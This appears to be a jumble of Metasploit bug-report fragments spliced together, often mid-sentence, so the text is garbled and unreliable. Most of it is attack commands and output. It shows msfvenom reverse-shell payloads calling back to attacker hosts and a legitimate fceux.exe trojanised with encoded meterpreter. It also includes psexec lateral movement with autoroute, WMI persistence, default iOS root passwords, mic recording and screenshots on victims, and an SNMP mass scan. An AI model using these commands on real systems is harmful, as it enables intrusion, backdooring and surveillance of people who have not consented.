[-] /home/elpadre/git/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/railgun/library.rb:334:in `block in process_function_call'
[-] /home/elpadre/git/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/railgun/library.rb:322:in `each_pair'
[-] /home/elpadre/git/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/railgun/library.rb:322:in `process_function_call'
[-] /home/elpadre/git/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/railgun/library.rb:86:in `call_function'
[-] /home/elpadre/git/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/railgun/library_wrapper.rb:25:in `method_missing'
[-] /home/elpadre/git/metasploit-framework/modules/post/windows/gather/enum_chrome.rb:111:in `decrypt_data'
[-] /home/elpadre/git/metasploit-framework/modules/post/windows/gather/enum_chrome.rb:159:in `block (3 levels) in process_files'
[-] /home/elpadre/git/metasploit-framework/modules/post/windows/gather/enum_chrome.rb:156:in `each'
[-] /home/elpadre/git/metasploit-framework/modules/post/windows/gather/enum_chrome.rb:156:in `block (2 levels) in process_files'
[-] /home/elpadre/git/metasploit-framework/modules/post/windows/gather/enum_chrome.rb:152:in `map!'
[-] /home/elpadre/git/metasploit-framework/modules/post/windows/gather/enum_chrome.rb:152:in `block in process_files'
[-] /home/elpadre/git/metasploit-framework/modules/post/windows/gather/enum_chrome.rb:136:in `each'
[-] /home/elpadre/git/metasploit-framework/modules/post/windows/gather/enum_chrome.rb:136:in `process_files'
[-] /home/elpadre/git/metasploit-framework/modules/post/windows/gather/enum_chrome.rb:327:in `block in run'
[-] /home/elpadre/git/metasploit-framework/modules/post/windows/gather/enum_chrome.rb:324:in `each'
[-] /home/elpadre/git/metasploit-framework/modules/post/windows/gather/enum_chrome.rb:324:in `run'
[*] post module execution completed
msf post(windows/gather/enum_chrome) >
i generate payload:
`msfvenom -p osx/x64/meterpreter_reverse_http lhost=metertest.ru lport=9999 luri=hello.php -t macho -f raw -o test` next i run msfconsole and enter the following commands:
use exploit/multi/handler
set payload osx/x64/meterpreter_reverse_http
set lhost metertest.ru
set lport 9999
set luri hello.php
``` when i run generated payload on macos system, msf show me next:
msf exploit(multi/handler) > run
[*] started http reverse handler on
[*] handling request from 192.168.56.101; (uuid: guuzvufk) redirecting stageless connection from /hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) redirecting stageless connection from /hello.php/07fi0ktd-ouudz0pzl1xqgdvo6izunqsdadec2lxvmfnk9g3rjnxbkcararr6hvscu with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) redirecting stageless connection from /hello.php/07fi0ktd-ouudz0pzl1xqgpeq61xbzbdphdm7qarn4buqr2ip-c1lrekz9qfpmrt with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) redirecting stageless connection from /hello.php/07fi0ktd-ouudz0pzl1xqgeupromoiayzzou0ja1 with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) redirecting stageless connection from /hello.php/07fi0ktd-ouudz0pzl1xqgacpgmkhnvz-w9lvpow-9pi_5aukvau with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) redirecting stageless connection from /hello.php/07fi0ktd-ouudz0pzl1xqgbnc51ilxlexplpfas_d_utial9qrloecnudwimcjxycgqwgoshggxje2mug9j0eze4on11oebt with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) redirecting stageless connection from /hello.php/07fi0ktd-ouudz0pzl1xxqlybhnilzl_oaos5br-kmmflbizslwly60vowpwhqrk4rrsoviq4iv9df7ebcbv0py6wmz2-jbruynhkxcm1kgyd8v2pgw with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
[*] handling request from 192.168.56.101; (uuid: guuzvufk) unknown request to /hello.php/hello.php/07fi0ktd-ouudz0pzl1xqgbmatwpebo2ze6c4tlgkxknqvxxpryr1kqywcxdvuvi0v8zdqrs5khhjbqewdtxqzaujyb0waacf4hmrc902nrf with ua ''
^c[-] exploit failed: interrupt [*] exploit completed, but no session was created.
## a temporary solution to the problem
modified the file lib/msf/core/handler/reverse_http.rb
changes are indicated by an arrow (>>)
``` 305 def on_request(cli, req) 306 thread.current[:cli] = cli 307 resp = rex::proto::http::response.new 308 info = process_uri_resource(req.relative_resource) 309 uuid = info[:uuid] || msf::payload::uuid.new 310 311 # configure the uuid architecture and payload if necessary 312 uuid.arch ||= self.arch 313 uuid.platform ||= self.platform 314 315 conn_id = luri
>> 316 conn_test = '' 317 if info[:mode] && info[:mode] != :connect
>> 318 conn_test = generate_uri_uuid(uri_checksum_conn, uuid) >> 319 conn_id << conn_test 320 else 321 conn_id << req.relative_resource 322 conn_id = conn_id.chomp(\'/\') 323 end 324 325 request_summary = "#{conn_id} with ua \'#{req.headers[\'user-agent\']}\'" 326 327 # validate known uuids for all requests if ignoreunknownpayloads is set 328 if datastore[\'ignoreunknownpayloads\'] && ! framework.uuid_db[uuid.puid_hex] 329 print_status("ignoring unknown uuid: #{request_summary}") 330 info[:mode] = :unknown_uuid 331 end 332 333 # validate known urls for all session init requests if ignoreunknownpayloads is set 334 if datastore[\'ignoreunknownpayloads\'] && info[:mode].to_s =~ /^init_/ 335 allowed_urls = framework.uuid_db[uuid.puid_hex][\'urls\'] || [] 336 unless allowed_urls.include?(req.relative_resource) 337 print_status("ignoring unknown uuid url: #{request_summary}") 338 info[:mode] = :unknown_uuid_url 339 end 340 end 341 342 self.pending_connections += 1 343 344 resp.body = \'\' 345 resp.code = 200 346 resp.message = \'ok\' 347 348 url = payload_uri(req) + conn_id 349 url << \'/\' unless url[-1] == \'/\' 350 351 # process the requested resource
352 case info[:mode] 353 when :init_connect 354 print_status("redirecting stageless connection from #{request_summary}") 355 356 # handle the case where stageless payloads call in on the same uri when they 357 # first connect
from there, we tell them to callback on a connect uri that 358 # was generated on the fly
this means we form a new session for each
359 360 # hurl a tlv back at the caller, and ignore the response 361 pkt = rex::post::meterpreter::packet.new(rex::post::meterpreter::packet_type_response, 362 'core_patch_url')
>> 363 pkt.add_tlv(rex::post::meterpreter::tlv_type_trans_url, conn_test + "/") 364 resp.body = pkt.to_r
this is certainly not a solution to the problem
a payload directs many requests without waiting for the server to respond
after changing the file, msf shows the following:
msf exploit(multi/handler) > run
[*] started http reverse handler on
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjsyghek-lopq2xggbvfhf8op9ccyhfzari2ba-zu0zppdyizumfougy2i3aeiexx4p with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjsygzxrwdsqu-jppexbvbbx_qc9lfxminj6fnqxgvp-m7d5oa93exiu3p1oscikwcut with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjsygctlxi0o6q7fn7qlpdsw7pmwbcchs59uhk2hvrdm7_ax1ea8mgech65_eeikqtoy with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjsygvsopiwy21yy_c7zo5z3jnobxtxdqd_v with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqpehjo53neua1kf0ywcngnw0kf2jnhqvhjxwx_9r0npyaolaeohim30dndtmgjaf9k -ozd with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqkslqmb4tjwy90tnbkoze7blohvdxgd38um78fyoeioywanfkxsu2i5igcjtfonczlhl6lfgit8z-sj4pyrlu-144yvok with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszq0vgej1aez_t0l7yiythbni26mdtysqlrttvlmojzlewjk77drjvrrswmrycpgxa7ikwns56g1qc-rhz with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqmp3sxo with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqdfszcmc_fdhmvrqhxzi6i2qb0e9vqr01e_v with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqzji5vca_8wys1mbkxnvwmlvtjk2s5dhhbvveagyl0zid5fm65viy8dporpcn with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqnradribuopi9f5zsizlwlhiwdh3fieheesgribr2sz69pipun2n01l3nktgzd_px4jzmo_7wn with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqmbifark9zte0ephstz0fjoopdkfuhy9zxapu2eji with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqilllx6-rkarmpi8u21urn1e7wkx with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqai6jihxopmxph9zzyasfpipd_9ohorhtjvkmojfb2hig7fqaxgezm3v9tikilszy6nhdcm with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqa1i4h1h83rrbuoyse0pzg-tuylhyvul with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqg8dfxxovfrbi6a1mzs-ycttpibzuoq2k1yub36fml_zfz0z4jc8ju6_p7e6yttguzaiedns2jmysrlw6mxxn6jzm2odr with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqi-fywyhfcf_r-9w6r6k5qo6pd-obdgmqsgigtasirf8tt-kmfibomracc8rdagakpwieys8zcr8uvyagg8zt43iw9siyjled2jh with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqqjzrnu3wm8yogew91mb0b882swjpozdg2s27b79vrn7wwjafr6z2jiggnlr67pv_efykz9 with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqhd_tnswjpblapry9xin5ljaic2hmjjqlz329iv with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqnt3w0t9fpb_nkvk0trr0x with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqzfcsuylsd4hbm9f30z3g-u with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqsbt8e79ip9afkj4c3z68z9e4isy43mq0qkpc2zohvndhfz_6psdtmbuds03xggdeegqrbrr64 with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqlg072wb4gij0wjyxmxtpj6x_z5qexwj_xn2xcgdtfutnaouz_h_l9a0-dlsmxf1o2ge6bbwyvrm8v99albcbb with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszq4d9lkrxrr4 with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqmgzr5xxx3joxnjejxvmxe_ltybhdsvuq7mopkpkdv3pimfgkhmmvpcgjboimmgmhyrqs4ornavqdu3izzjfur6nacgqa5ysrejqhcxd with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqeot8al9bvxbsfoscejwjtx80fek-5w0y5auzcbayv-lotmhrieyqps_um_ with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqsya1sacnyinnbqgsvylcrsambyu6s14yhm4mitmqn--9umz8lhpn_w8revz3plmvjk with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) redirecting stageless connection from /hello.php/u-waypworrxsadtridjszqmiueyz3snchkdhl-1nw9i with ua ''
[*] handling request from 192.168.56.101; (uuid: 3ccrbp5x) attaching orphaned/stageless session...
[*] meterpreter session 1 opened (192.168.1.142:9999 -> 192.168.56.101:49180) at 2018-01-06 19:57:49 +0300
meterpreter > help core commands
=============
**i think that you need to repair the payload, handler work correct.**
reverse_https payload is executed on victims computer
victim connects back with initial shell
stdapi is unable to load even manually giving the error `failed to load extension: no response was received to the core_enumextcmd request.` 4
session dies rsions.
use post/windows/manage/reflective_dll_inject
set < options > exploit ## system info target : windows 7 ultimate x64
attacker : kali (mate)
start a reverse_https handler at 127.0.01:8443.
set a reverse proxy(nginx) which listen the 443 port, and reverse the traffic to msf listener(127.0.01:8443).
generate a payload which point to rev.xxx.com:443.
rev.xxx.com point to a cdn,and the cdn transfer the traffic to my local reverse proxy(nginx) 443 port
i tried to hack android phone on kali linux on wan
i got success in every step but at the end when i put a command '?' there were no android command.i tried this method on mobile data as well as onwifi, but in both the situation i get this command rsions.
open `msfconsole` on a computer with multiple processors or processor cores
start spooling to a file, e.g
`spool output.log`
use `auxiliary/scanner/snmp/snmp_login`
set `threads` to a high number, e.g
set `rhosts` to a large address space with systems that will respond to snmp queries, e.g
192.168.0.0/16
set any other options necessary to obtain responses to snmp queries, e.g
a file with correct snmp community strings
run the module
run /usr/share/metasploit-framework/tools/exploit/msu_finder.rb -q "ms15-100" 2
i get the following error:
[*] searching advisories that include ms15-100 via technet
[*] advisories found (1): ms15-100
[*] please wait while the download links are being collected...
[*] max number of active collecting clients: 10
/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/patch_finder-1.0.2/lib/patch_finder/core/helper.rb:18:in `print_verbose_error': undefined local variable or method `msge' for #<patchfinder::msu: @verbose=true> (nameerror)
did you mean? msg from /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/patch_finder-1.0.2/lib/patch_finder/msu.rb:97:in `collect_links_from_msb' from /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/patch_finder-1.0.2/lib/patch_finder/msu.rb:38:in `block (2 levels) in find_msu_download_links' from /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/patch_finder-1.0.2/lib/patch_finder/core/thread_pool.rb:20:in `block (4 levels) in initialize' from /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/patch_finder-1.0.2/lib/patch_finder/core/thread_pool.rb:18:in `loop' from /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/patch_finder-1.0.2/lib/patch_finder/core/thread_pool.rb:18:in `block (3 levels) in initialize' from /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/patch_finder-1.0.2/lib/patch_finder/core/thread_pool.rb:17:in `catch' from /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/patch_finder-1.0.2/lib/patch_finder/core/thread_pool.rb:17:in `block (2 levels) in initialize'
gain initial access via psexec `[*] 192.168.1.5:445 - connecting to the server..
[*] 192.168.1.5:445 - authenticating to 192.168.1.5:445 as user 'hack'..
[*] 192.168.1.5:445 - checking for system32\\windowspowershell\\v1.0\\powershell.exe [*] 192.168.1.5:445 - powershell found [*] 192.168.1.5:445 - selecting powershell target [*] 192.168.1.5:445 - powershell command length: 2388 [*] 192.168.1.5:445 - executing the payload..
[*] 192.168.1.5:445 - binding to 367abb81-9844-35f1-ad32-
98f038001003:2.0@ncacn_np:192.168.1.5[\\svcctl] ..
[*] 192.168.1.5:445 - bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.5[\\svcctl] ..
[*] 192.168.1.5:445 - obtaining a service manager handle..
[*] 192.168.1.5:445 - creating the service..
[+] 192.168.1.5:445 - successfully created the service [*] 192.168.1.5:445 - starting the service..
[+] 192.168.1.5:445 - service start timed out, ok if running a command or non-service executable..
[*] 192.168.1.5:445 - removing the service..
[+] 192.168.1.5:445 - successfully removed the service [*] 192.168.1.5:445 - closing service handle..
[*] sending stage (179267 bytes) to 192.168.1.5 [*] meterpreter session 1 opened (192.168.1.6:4444 -> 192.168.1.5:49159) at 2017-11-17 16:05:07 +1100
` run autoroute module `[!] session may not be compatible with this module
[*] running module against hack-pc [*] searching for subnets to autoroute
[+] route added to subnet 192.168.1.0/255.255.255.0 from host's routing table
[*] post module execution completed
` the run a psexec with another host on the same subnet `[*] started bind handler [*] 192.168.1.8:445 - connecting to the server..
[*] 192.168.1.8:445 - authenticating to 192.168.1.8:445 as user 'hack'..
[*] 192.168.1.8:445 - checking for system32\\windowspowershell\\v1.0\\powershell.exe [*] 192.168.1.8:445 - powershell found [*] 192.168.1.8:445 - selecting powershell target [*] 192.168.1.8:445 - powershell command length: 2521 [*] 192.168.1.8:445 - executing the payload..
[*] 192.168.1.8:445 - binding to 367abb81-9844-35f1-ad32-
98f038001003:2.0@ncacn_np:192.168.1.8[\\svcctl] ..
[*] 192.168.1.8:445 - bound to 367abb81-9844-35f1-ad32-
98f038001003:2.0@ncacn_np:192.168.1.8[\\svcctl] ..
[*] 192.168.1.8:445 - obtaining a service manager handle..
[*] 192.168.1.8:445 - creating the service..
[+] 192.168.1.8:445 - successfully created the service [*] 192.168.1.8:445 - starting the service..
[+] 192.168.1.8:445 - service start timed out, ok if running a command or non-service executable..
[*] 192.168.1.8:445 - removing the service..
[+] 192.168.1.8:445 - successfully removed the service [*] 192.168.1.8:445 - closing service handle..
[*] exploit completed, but no session was created.
load up a list of rhosts, some of which may not be mssql boxes
run the module
hi everybody, i have an issue with something that was working for months with no problems
on kali linux
- making the backdoor with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.1.5 lport=443 -f exe -o reversehttps5.exe - and then starting up a listener with use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 192.168.1.5
set lport 443
exploit - on a windows 7
executing reversehttps5.exe ok i got a shell [*] handling request from 192.168.1.1; (uuid: jgajik0c) staging x64 payload (206423 bytes) ...
[*] meterpreter session 1 opened (192.168.1.5:443 -> 192.168.1.1:3064) at 2017-11-05 14:21:42 +0100 **this session is working, i can do everything i want**
load auto_add_route
load sounds
setg timestampoutput true
setg verbose true
setg exitonsession false
setg enablestageencoding true use exploit/multi/handler
setg lhost 0.0.0.0
set lport 4444
set payload linux/x86/meterpreter/reverse_tcp
exploit msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=myip lport=4444 -f elf -o kawaxi ```
the victim is running backtrack 2.6.30.9 i686 gnu/linux however i also ran the payload on my system and achieved the same result.
use exploit/windows/local/wmi_persistence
set session
set payload windows/meterpreter/reverse_tcp
the session is running with system privileges.
create the payload (its the php/meterpreter/reverse_tcp payload, but all meterpreter payloads dont work)
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost myip
set lhost myport
wait for it.
meterpreter session opened.
meterpreter > help
= gives 0 response or anything back
meterpreter > ls
= unknown command: ls
copy fceux.exe (from version 2.2.2 of fceux) onto kali system.
enter the following command:
`msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.74.128 lport=4445 -x fceux.exe -e x86/shikata_ga_nai -i 7 -k -f exe > notfceux.exe`
manually added tag, comment and info: `hosts --tag tag-test 10.0.1.1`
`hosts --comment 'test comment' 10.0.1.1`
`hosts --info 'fake info' 10.0.1.1` 2
confirm all commands populated:
`hosts -u -c address,name,service_count,vuln_count,os_name,os_flavor,os_sp,arch,purpose,comments,tags` 3
export the database to xml:
`db_export -f xml db_export_test.xml` 4
exit msfconsole and purge the old database:
`msfdb reinit` 5
open msfconsole and import the xml:
`msfconsole -q`
`db_status`
`db_import db_export_test.xml` 6
confirm all data was populated (fails):
`hosts -u -c address,name,service_count,vuln_count,os_name,os_flavor,os_sp,arch,purpose,comments,tags`
run the command: "record_mic -d 20" on a reverse tcp connection, give you the error:
[-] error running command record_mic: rex::timeouterror operation timed out.
it works sometimes if you reduce the length, but there should be a way to avoid the timeout error.
run the command: "screenshot" on a reverse tcp connection, give you the error:
[-] stdapi_ui_desktop_screenshot: operation failed: 1
so i'm performing a pentest at a local company fond of apple products thats overly smug and i by chance found a jailbroken one with default password
so i decided to test this module out
it does spawn a shell and session but the shell dies
##how did you do it
set ssh_timeout 60
set wfsdelay 2
set verbose true
set ssh_debug true
set rhost [ip address]
msf exploit(cydia_default_ssh) > exploit [*] 192.168.1.xx:22 - attempt to login as 'root' with password 'alpine'
d, [2017-10-17t10:42:58.141711 #2469] debug -- net.ssh.transport.session[650a2e8]: establishing connection to 192.168.1.xx:xx through proxy
[*] 192.168.1.xx:22 - attempt to login as 'mobile' with password 'dottie'
d, [2017-10-17t10:43:01.217229 #2469] debug -- net.ssh.transport.session[64ebc6c]: establishing connection to 192.168.1.xx:xx through proxy
[*] exploit completed, but no session was created.
msf exploit(cydia_default_ssh) > exploit -j
[*] exploit running as background job 0
[*] 192.168.1.xx:xx - attempt to login as 'root' with password 'alpine'
d, [2017-10-17t10:43:49.429982 #2469] debug -- net.ssh.transport.session[625a2c8]: establishing connection to 192.168.1,xx:xx through proxy
